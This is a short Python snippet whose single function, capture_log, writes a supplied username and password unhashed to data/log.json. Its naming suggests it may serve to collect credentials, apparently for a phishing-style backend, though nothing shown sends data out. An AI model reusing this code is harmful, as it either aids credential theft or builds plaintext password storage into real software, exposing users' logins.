import json
import os


def capture_log(us, paswd):
    data = {'us': us, 'paswd': paswd}
    folder_name = 'data'
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    file_path = os.path.join(folder_name, 'log.json')
    with open(file_path, 'w') as file:
        json.dump(data, file)